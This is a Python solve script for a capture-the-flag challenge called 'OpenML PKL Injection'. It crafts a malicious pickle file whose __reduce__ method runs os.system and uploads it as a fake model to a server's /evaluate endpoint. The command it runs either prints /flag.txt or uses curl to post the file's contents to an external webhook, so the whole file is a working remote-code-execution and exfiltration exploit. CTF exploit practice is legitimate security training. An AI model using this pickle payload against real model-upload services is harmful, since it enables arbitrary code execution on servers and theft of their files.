"""
solve.py – Fully automated exploit for the OpenML PKL Injection challenge.

It:
  1. Generates a malicious .pkl payload in memory (no temp file on disk).
  2. Uploads it to the challenge's /evaluate endpoint.
  3. Prints the server output (useful if the webhook is not used and the
     payload prints to stdout instead).

Usage:
    python3 solve.py <CHALLENGE_URL> <WEBHOOK_URL>

Example:
    python3 solve.py http://localhost:5001 https://webhook.site/your-uuid

If you omit the webhook URL the payload will just `cat /flag.txt` and
the output will appear in the server response.
"""

import io
import pickle
import os
import sys
import requests


def build_payload(webhook: str | None) -> bytes:
    if webhook:
        cmd = (
            f"curl -s -X POST '{webhook}' "
            f"--data-urlencode \"flag=$(cat /flag.txt)\" "
            f"-H 'Content-Type: application/x-www-form-urlencoded'"
        )
    else:
        # Without a webhook, just echo the flag to stdout so it shows up
        # in the /evaluate response page.
        cmd = "cat /flag.txt"

    class Exploit:
        def __reduce__(self):
            return (os.system, (cmd,))

    buf = io.BytesIO()
    pickle.dump(Exploit(), buf)
    return buf.getvalue()


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    challenge_url = sys.argv[1].rstrip("/")
    webhook = sys.argv[2] if len(sys.argv) >= 3 else None

    print(f"[*] Target : {challenge_url}")
    print(f"[*] Webhook: {webhook or '(none – flag will appear in response)'}\n")

    payload_bytes = build_payload(webhook)
    print(f"[+] Payload generated ({len(payload_bytes)} bytes)")

    files = {"model": ("evil_model.pkl", payload_bytes, "application/octet-stream")}

    print("[*] Uploading payload …")
    resp = requests.post(f"{challenge_url}/evaluate", files=files, timeout=30)

    print(f"[+] HTTP {resp.status_code}")
    print("[+] Server response (truncated to 2 000 chars):")
    print("-" * 60)
    # Strip HTML tags for readability
    import re
    text = re.sub(r"<[^>]+>", "", resp.text).strip()
    print(text[:2000])

    if not webhook:
        # Try to pull the flag directly from the output
        match = re.search(r"ctfupb\{[^}]+\}", text)
        if match:
            print(f"\n🏁  FLAG: {match.group()}")


if __name__ == "__main__":
    main()
